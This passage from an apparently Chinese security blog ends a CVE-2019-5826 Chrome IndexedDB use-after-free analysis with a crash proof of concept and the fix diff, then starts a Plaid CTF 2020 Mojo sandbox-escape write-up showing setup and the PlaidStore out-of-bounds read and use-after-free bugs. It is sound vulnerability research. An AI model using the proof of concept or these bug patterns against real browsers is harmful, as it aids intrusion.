<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// third_party/blink/renderer/modules/indexeddb/web_idb_factory_impl.cc</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WebIDBFactoryImpl::Open</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="built_in">std</span>::make_unique&lt;IndexedDBDatabaseCallbacksImpl&gt;(</span></span></span><br><span class="line"><span class="function"><span class="params">           base::WrapUnique(database_callbacks));</span></span></span><br><span class="line"><span class="function"><span class="params">   DCHECK(!name.IsNull());</span></span></span><br><span class="line"><span class="function"><span class="params">   factory_-&gt;Open(GetCallbacksProxy(<span class="built_in">std</span>::move(callbacks_impl)),</span></span></span><br><span class="line"><span class="function"><span class="params">                  GetDatabaseCallbacksProxy(<span class="built_in">std</span>::move(database_callbacks_impl)),</span></span></span><br><span class="line"><span class="function"><span class="params">                  name, version, transaction_id);</span></span></span><br><span class="line"><span class="function"><span class="params">+  <span class="keyword">if</span> (version == <span class="number">3</span>) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">+    mojom::blink::IDBCallbacksAssociatedPtrInfo ptr_info;</span></span></span><br><span class="line"><span class="function"><span class="params">+    <span class="keyword">auto</span> request = mojo::MakeRequest(&amp;ptr_info);</span></span></span><br><span class="line"><span class="function"><span class="params">+    factory_-&gt;DeleteDatabase(<span class="built_in">std</span>::move(ptr_info), origin, name, <span class="literal">true</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">+    factory_-&gt;AbortTransactionsForDatabase(origin, base::OnceCallback&lt;<span class="keyword">void</span>(blink::mojom::IDBStatus)&gt;());</span></span></span><br><span class="line"><span class="function"><span class="params">+  &#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> &#125;</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="d-POC">d. POC</h4>
<p>笔者在<code>issue 941746</code>提供的poc上做了一点修改，新构造的POC删除了无用的语句，并使Chrome触发Crash</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line">            /*</span><br><span class="line">                在chrome进程中依次同步执行open、deleteDatabase以及AbortTransactionsForDatabase函数</span><br><span class="line">                执行完成后将会产生一个悬垂指针</span><br><span class="line">            */</span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="built_in">window</span>.indexedDB.open(<span class="string">"db1"</span>, <span class="number">3</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 尝试使用这个悬垂指针，应该会造成crash</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.indexedDB.deleteDatabase(<span class="string">"db1"</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"poc()"</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Chrome成功crash</p>
<p><img src="/2020/10/CVE-2019-5826/crash.png" alt="img"></p>
<blockquote>
<p>图中多输出的<code>nice</code>，为chrome打patch时多添加的一条printf语句</p>
<p>该语句的输出表示patch部分代码被执行。</p>
</blockquote>
<h3 id="4-后记">4. 后记</h3>
<p>以下是chrome团队修复后的代码。该<a href="https://chromium.googlesource.com/chromium/src.git/+/eaf2e8bce3855d362e53034bd83f0e3aff8714e4%5E%21/" target="_blank" rel="noopener">patch</a>彻彻底底将<code>connections_</code>集合中的所有连接全部关闭。patch前的代码依赖<strong>迭代器</strong>来判断是否全部关闭所有连接，而patch后的代码使用集合元素个数来进行判断，某种程度上使得代码更加安全。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="meta">@@ -1949,10 +1949,10 @@</span></span><br><span class="line">     request-&gt;AbortForForceClose();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-  auto it = connections_.begin();</span></span><br><span class="line"><span class="deletion">-  while (it != connections_.end()) &#123;</span></span><br><span class="line"><span class="deletion">-    IndexedDBConnection* connection = *it++;</span></span><br><span class="line"><span class="addition">+  while (!connections_.empty()) &#123;</span></span><br><span class="line"><span class="addition">+    IndexedDBConnection* connection = *connections_.begin();</span></span><br><span class="line">     connection-&gt;ForceClose();</span><br><span class="line"><span class="addition">+    connections_.erase(connection);</span></span><br><span class="line">   &#125;</span><br><span class="line">   DCHECK(connections_.empty());</span><br><span class="line">   DCHECK(!active_request_);</span><br></pre></td></tr></table></figure>
<h2 id="四、参考">四、参考</h2>
<ul>
<li>
<p><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#the-most-secure-browser-pwning-chrome-from--to--16274" target="_blank" rel="noopener">The Most Secure Browser? Pwning Chrome from 2016 to 2019</a></p>
<ul>
<li><a href="http://i.blackhat.com/USA-19/Wednesday/us-19-Feng-The-Most-Secure-Browser-Pwning-Chrome-From-2016-To-2019.pdf" target="_blank" rel="noopener">Presentation Slides</a></li>
<li><a href="http://i.blackhat.com/USA-19/Wednesday/us-19-Feng-The-Most-Secure-Browser-Pwning-Chrome-From-2016-To-2019-wp.pdf" target="_blank" rel="noopener">White Paper</a>（<strong>相当有用</strong>）</li>
</ul>
</li>
<li>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-5826" target="_blank" rel="noopener">NVD - CVE-2019-5826 Dtail</a></p>
</li>
<li>
<p><a href="https://crbug.com/941746" target="_blank" rel="noopener">Chrome Issue 941746: Security: UAF in content::IndexedDBDatabase</a></p>
</li>
<li>
<p><a href="https://www.anquanke.com/post/id/183809#h3-3" target="_blank" rel="noopener">通过IndexedDB条件竞争实现Chrome沙箱逃逸（上）</a></p>
<blockquote>
<p>该文章<strong>并没有涉及</strong>我们当前所研究的UAF漏洞，但即便如此，它仍然提供了一些关于<code>IndexedDB</code>相关的说明。</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>vulnerability analysis</category>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>Plaid CTF 2020 mojo Writeup</title>
    <url>/2020/10/mojo/</url>
    <content><![CDATA[<h2 id="1-简介">1. 简介</h2>
<p>Plaid CTF 2020 <code>mojo</code> 是 chromium sandbox escape 沙箱逃逸的一道基础题，适合用于<code>chrome</code>入门。</p>
<p>题目来源 - <a href="https://ctftime.org/task/11314" target="_blank" rel="noopener">ctftime - task11314</a></p>
<a id="more"></a>
<h2 id="2-环境配置">2. 环境配置</h2>
<ul>
<li>
<p>由<code>dockerfile</code>中的命令可知，启动<code>chrome</code>的脚本为<code>visit.sh</code>。而该脚本的内容如下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">timeout 20 ./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest <span class="string">"<span class="variable">$1</span>"</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由<code>visit.sh</code>中的命令可知，启动chrome的命令为</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest &lt;URL&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以设置一个<code>--user-data-dir</code>参数来更加方便地使用<a href="https://chromedevtools.github.io/devtools-protocol/" target="_blank" rel="noopener">DevTools</a></p>
<blockquote>
<p>加上这个参数后，最直观的作用就是执行JS代码时，<strong>所有的<code>console.log</code>输出都将会同步输出至终端</strong>。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">基础知识：将DevTools用作协议客户端</span><br><span class="line">开发人员工具前端可以连接到远程运行的Chrome实例进行调试。为了使这种情况起作用，您应该使用remote-debugging-port命令行开关启动主机Chrome实例：</span><br><span class="line"></span><br><span class="line">chrome.exe --remote-debugging-port&#x3D; 9222</span><br><span class="line">然后，您可以使用不同的用户个人资料启动单独的客户端Chrome实例：</span><br><span class="line"></span><br><span class="line">chrome.exe --user-data-dir &#x3D; &lt;someDir&gt;</span><br><span class="line">现在，您可以从客户端导航到给定的端口，并附加到任何已发现的选项卡以进行调试：http:&#x2F;&#x2F;localhost:9222</span><br></pre></td></tr></table></figure>
<p>即我们最后<strong>实际启动</strong>chrome的命令为</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest &lt;URL&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>--headless</code>：Chrome-headless 模式， Google 针对 Chrome 浏览器 59版 新增加的一种模式，可以让你不打开UI界面的情况下使用 Chrome 浏览器，所以运行效果与 Chrome 保持完美一致。使用该参数将不会启动chrome的GUI界面，如需启动GUI界面则需删除该参数。</p>
<p><code>--enable-blink-features</code>：启用一个或多个启用Blink内核运行时的功能。在这里启用了<code>MojoJS</code></p>
</blockquote>
</li>
<li>
<p>笔者第一次执行时会报错，提示<code>No usable sandbox</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kiprey @ Kipwn in /usr/class/CTFs/mojo/chrome [15:10:00] C:1</span></span><br><span class="line">$ ./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --<span class="built_in">enable</span>-blink-features=MojoJS test.html</span><br><span class="line">[1003/151007.365372:FATAL:zygote_host_impl_linux.cc(116)] No usable sandbox! Update your kernel or see https://chromium.googlesource.com/chromium/src/+/master/docs/linux/suid_sandbox_development.md <span class="keyword">for</span> more information on developing with the SUID sandbox. If you want to live dangerously and need an immediate workaround, you can try using --no-sandbox.</span><br><span class="line"><span class="comment">#0 0x560df69de579 base::debug::CollectStackTrace()</span></span><br><span class="line"><span class="comment">#1 0x560df69426f3 base::debug::StackTrace::StackTrace()</span></span><br><span class="line"><span class="comment">#2 0x560df6954475 logging::LogMessage::~LogMessage()</span></span><br><span class="line"><span class="comment">#3 0x560df824a22e service_manager::ZygoteHostImpl::Init()</span></span><br><span class="line"><span class="comment">#4 0x560df652ad37 content::ContentMainRunnerImpl::Initialize()</span></span><br><span class="line"><span class="comment">#5 0x560df657965a service_manager::Main()</span></span><br><span class="line"><span class="comment">#6 0x560df6529351 content::ContentMain()</span></span><br><span class="line"><span class="comment">#7 0x560df657849d headless::(anonymous namespace)::RunContentMain()</span></span><br><span class="line"><span class="comment">#8 0x560df657819b headless::HeadlessShellMain()</span></span><br><span class="line"><span class="comment">#9 0x560df3feac27 ChromeMain</span></span><br><span class="line"><span class="comment">#10 0x7f953511cbbb __libc_start_main</span></span><br><span class="line"><span class="comment">#11 0x560df3feaa6a _start</span></span><br><span class="line"></span><br><span class="line">Received signal 6</span><br><span class="line"><span class="comment">#0 0x560df69de579 base::debug::CollectStackTrace()</span></span><br><span class="line"><span class="comment">#1 0x560df69426f3 base::debug::StackTrace::StackTrace()</span></span><br><span class="line"><span class="comment">#2 0x560df69de120 base::debug::(anonymous namespace)::StackDumpSignalHandler()</span></span><br><span class="line"><span class="comment">#3 0x7f95373c7520 (/usr/lib/x86_64-linux-gnu/libpthread-2.29.so+0x1351f)</span></span><br><span class="line"><span class="comment">#4 0x7f953512ff61 gsignal</span></span><br><span class="line"><span class="comment">#5 0x7f953511b535 abort</span></span><br><span class="line"><span class="comment">#6 0x560df69dd075 base::debug::BreakDebugger()</span></span><br><span class="line"><span class="comment">#7 0x560df6954914 logging::LogMessage::~LogMessage()</span></span><br><span class="line"><span class="comment">#8 0x560df824a22e service_manager::ZygoteHostImpl::Init()</span></span><br><span class="line"><span class="comment">#9 0x560df652ad37 content::ContentMainRunnerImpl::Initialize()</span></span><br><span class="line"><span class="comment">#10 0x560df657965a service_manager::Main()</span></span><br><span class="line"><span class="comment">#11 0x560df6529351 content::ContentMain()</span></span><br><span class="line"><span class="comment">#12 0x560df657849d headless::(anonymous namespace)::RunContentMain()</span></span><br><span class="line"><span class="comment">#13 0x560df657819b headless::HeadlessShellMain()</span></span><br><span class="line"><span class="comment">#14 0x560df3feac27 ChromeMain</span></span><br><span class="line"><span class="comment">#15 0x7f953511cbbb __libc_start_main</span></span><br><span class="line"><span class="comment">#16 0x560df3feaa6a _start</span></span><br><span class="line">  r8: 0000000000000000  r9: 00007ffcf028b6e0 r10: 0000000000000008 r11: 0000000000000246</span><br><span class="line"> r12: 00007ffcf028c9a8 r13: 00007ffcf028b980 r14: 00007ffcf028c9b0 r15: aaaaaaaaaaaaaaaa</span><br><span class="line">  di: 0000000000000002  si: 00007ffcf028b6e0  bp: 00007ffcf028b930  bx: 00007ffcf028b9a4</span><br><span class="line">  dx: 0000000000000000  ax: 0000000000000000  cx: 00007f953512ff61  sp: 00007ffcf028b6e0</span><br><span class="line">  ip: 00007f953512ff61 efl: 0000000000000246 cgf: 002b000000000033 erf: 0000000000000000</span><br><span class="line"> trp: 0000000000000000 msk: 0000000000000000 cr2: 0000000000000000</span><br><span class="line">[end of stack trace]</span><br><span class="line">Calling _exit(1). Core file will not be generated.</span><br></pre></td></tr></table></figure>
<p>需要执行以下命令，以启用非特权用户命名空间 - <a href="https://github.com/puppeteer/puppeteer/blob/main/docs/troubleshooting.md#setting-up-chrome-linux-sandbox" target="_blank" rel="noopener">sandbox问题参考</a></p>
<blockquote>
<p>linux命名空间是一种轻量级的虚拟化手段 - <a href="https://www.cnblogs.com/long123king/p/3535462.html" target="_blank" rel="noopener">参考</a></p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.unprivileged_userns_clone=1</span><br></pre></td></tr></table></figure>
<p>之后即可正常运行chrome</p>
</li>
<li>
<p>调试浏览器时，最好在本地开一个web服务，<strong>而不是让浏览器直接访问本地html文件</strong>，因为这其中<strong>访问的协议是不一样的</strong>。浏览器访问web服务的协议是<code>http</code>，而访问本地文件的协议是<code>file</code>。</p>
<p>调试时尽量架设本地服务器来避免file协议与http协议实现过程中的某些差异，例如某些API的差异、跨域请求的差异等。</p>
<p>我们在这里可以使用python自带的httpServer来启动一个web服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用<code>gdb script</code>来调试chrome</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gdbinit</span></span><br><span class="line"><span class="comment"># 读取符号</span></span><br><span class="line">file ./chrome</span><br><span class="line"><span class="comment"># 设置启动参数</span></span><br><span class="line"><span class="built_in">set</span> args --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --<span class="built_in">enable</span>-blink-features=MojoJS http://localhost:8000/test.html</span><br><span class="line"><span class="comment"># 设置执行fork后继续调试父进程</span></span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br></pre></td></tr></table></figure>
<p>之后运行以下命令即可启动调试。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb -x gidbinit</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="3-Mojo简介">3. Mojo简介</h2>
<ul>
<li>
<p>Chrome安全体系架构的关键支撑就是沙箱。Chrome将网络的大部分攻击面（例如：DOM渲染、脚本执行、媒体解码等）限制在沙箱进程中。同时，存在一个中央进程，称之为浏览器进程，该进程可以完全不带沙箱运行。而Chrome的数个进程需要相互通信以完成工作协调，而这就涉及到了<strong>进程间或进程内的模块间通信</strong>（<code>IPC,Inter-Process Communication</code>）其中，Mojo是Chromium提供的用于IPC的一种机制。</p>
</li>
<li>
<p>在Chrome中，Mojo机制使用C++实现。但Mojo仍然提供针对C++和JS语言的调用接口。</p>
</li>
<li>
<p>我们可以通过启用MojoJS blink绑定（在Chrome命令行中使用<code>--enable-blink-features=MojoJS</code>）来模拟一个渲染器进程。这些绑定将Mojo平台直接暴露给JavaScript，从而使我们可以完全绕过Blink绑定，直接使用JS来调用Mojo平台中的代码。</p>
<blockquote>
<p>可以简单的理解为，Mojo的JS接口通过<code>--enable-blink-features=MojoJS</code>参数打开，这样外部JS代码可以直接调用Mojo的JS接口，降低漏洞利用难点。</p>
</blockquote>
</li>
<li>
<p>更多信息可以阅读<a href="https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md" target="_blank" rel="noopener">Mojo Docs</a></p>
</li>
</ul>
<h2 id="4-漏洞分析">4. 漏洞分析</h2>
<blockquote>
<p>注意！在阅读漏洞分析前，请先详细阅读</p>
<ul>
<li>
<p><a href="https://www.jianshu.com/p/ce068f112945" target="_blank" rel="noopener">Mojo &amp; Services 简介</a></p>
</li>
<li>
<p><a href="https://blog.csdn.net/tornmy/article/details/82748058" target="_blank" rel="noopener">chromium mojo 快速入门</a></p>
</li>
<li>
<p><strong>重要！</strong> <strong><a href="https://blog.wuhao13.xin/1001.html" target="_blank" rel="noopener">利用Mojo IPC的UAF漏洞实现Chrome浏览器沙箱逃逸</a></strong></p>
</li>
</ul>
<blockquote>
<p>该文的翻译不是很到位，建议直接阅读<a href="https://theori.io/research/escaping-chrome-sandbox/" target="_blank" rel="noopener">原文</a></p>
</blockquote>
<p>并理解其中<strong>关于Mojo的更多详细信息</strong>以及<strong>指针生命周期的漏洞问题</strong>。该题基于上述文章中的漏洞改编而成。</p>
</blockquote>
<h3 id="a-代码提取">a. 代码提取</h3>
<blockquote>
<p>该题给出了一个<code>plaidstore.diff</code>文件。而这个diff文件向我们展示了新声明的Mojo接口。我们需要通过调用对应的MojoJS接口来利用其中的漏洞。</p>
</blockquote>
<p>在<code>plaidstore.diff</code>文件中可以看出，该版本实现了一个新接口<code>PlaidStore</code>。将相关代码从中剥离整理出，可分为三类：</p>
<ul>
<li>
<p>一部分代码是在原Chrome代码中添加的代码片段。</p>
<p>搜索可得，在<code>PopulateFrameBinders</code>函数中，该题新增了一个回调函数 - <a href="https://source.chromium.org/chromium/chromium/src/+/master:content/browser/browser_interface_binders.cc;l=743;bpv=0;bpt=1" target="_blank" rel="noopener">源码</a></p>
<blockquote>
<p>通过<code>chrome</code>代码交叉引用查询可得，调用层次为</p>
<p><code>BrowserInterfaceBrokerImpl::PopulateBinderMap</code> -&gt; <code>PopulateBinderMap</code> -&gt; <code>PopulateFrameBinders</code></p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PopulateFrameBinders</span><span class="params">(RenderFrameHostImpl* host, mojo::BinderMap* <span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//....</span></span><br><span class="line">    <span class="comment">// 新添加的内容</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;Add&lt;blink::mojom::PlaidStore&gt;(</span><br><span class="line">      base::BindRepeating(&amp;RenderFrameHostImpl::CreatePlaidStore,</span><br><span class="line">                          base::Unretained(host)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RenderFrameHostImpl::CreatePlaidStore</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PlaidStoreImpl::Create(<span class="keyword">this</span>, <span class="built_in">std</span>::move(receiver));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>再一部分代码是mojo特有的接口文件，届时将会根据此文件生成对应接口<code>xx</code>。而该接口的实际实现是<code>xxImpl</code>。</p>
<p>例如，下面定义的接口为<code>PlaidStore</code>，但C++中实际实现为<code>PlaidStoreImpl</code>类</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PlaidStore.mojom文件</span></span><br><span class="line"><span class="keyword">module</span> blink.mojom;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This interface provides a data store</span></span><br><span class="line">interface PlaidStore</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Stores data in the data store</span></span><br><span class="line">    StoreData(<span class="built_in">string</span> key, <span class="built_in">array</span>&lt;uint8&gt; data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Gets data from the data store</span></span><br><span class="line">    GetData(<span class="built_in">string</span> key, uint32 count) = &gt; (<span class="built_in">array</span>&lt;uint8&gt; data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最后一部分代码是声明的<code>PlaidStore</code>接口所对应的C++实现<code>PlaidStoreImpl</code>类</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> content</span><br><span class="line">&#123;</span><br><span class="line">    PlaidStoreImpl::PlaidStoreImpl(</span><br><span class="line">        RenderFrameHost *render_frame_host)</span><br><span class="line">        : render_frame_host_(render_frame_host) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    PlaidStoreImpl::~PlaidStoreImpl() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &amp;data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        data_store_[key] = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">        GetDataCallback callback)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">std</span>::move(callback).Run(&#123;&#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> it = data_store_.find(key);</span><br><span class="line">        <span class="keyword">if</span> (it == data_store_.end())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">std</span>::move(callback).Run(&#123;&#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.begin(), it-&gt;second.begin() count)</span></span>;</span><br><span class="line">        <span class="built_in">std</span>::move(callback).Run(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// static</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">        mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;PlaidStoreImpl&gt;(render_frame_host),</span><br><span class="line">                                    <span class="built_in">std</span>::move(receiver));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// namespace content</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> content</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RenderFrameHost</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PlaidStoreImpl</span> :</span> <span class="keyword">public</span> blink::mojom::PlaidStore</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">explicit</span> <span class="title">PlaidStoreImpl</span><span class="params">(RenderFrameHost *render_frame_host)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">            mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span>;</span><br><span class="line"></span><br><span class="line">        ~PlaidStoreImpl() <span class="keyword">override</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// PlaidStore overrides:</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &amp;data)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">            GetDataCallback callback)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="comment">// 注意这里的`render_frame_host_`</span></span><br><span class="line">        RenderFrameHost *render_frame_host_;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt;&gt; data_store_;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125; <span class="comment">// namespace content</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="b-OOB漏洞">b. OOB漏洞</h3>
<blockquote>
<p>OOB（Out Of Bound）是<strong>信息外带漏洞</strong>，例如越界读取等都属于OOB漏洞。</p>
</blockquote>
<p>在函数<code>PlaidStoreImpl::GetData</code>中，程序并没有对传入的参数<code>count</code>进行判断，因此该函数可以越界读取，返回比实际存储范围更大的数据。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">      GetDataCallback callback)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::move(callback).Run(&#123;&#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> it = data_store_.find(key);</span><br><span class="line">    <span class="keyword">if</span> (it == data_store_.end())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::move(callback).Run(&#123;&#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将传入的count作为数据的获取量，返回count单位的数据</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.begin(), it-&gt;second.begin() count)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::move(callback).Run(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="c-UAF漏洞">c. UAF漏洞</h3>
<ul>
<li>
<p>当<code>PlaidStoreImpl</code>类执行构造函数时，该类的一个实例将会<strong>保存</strong>传入的<code>render_frame_host</code><strong>原始指针</strong>。（注意保留的是<strong>原始</strong>指针<strong>而不是智能指针</strong>）</p>
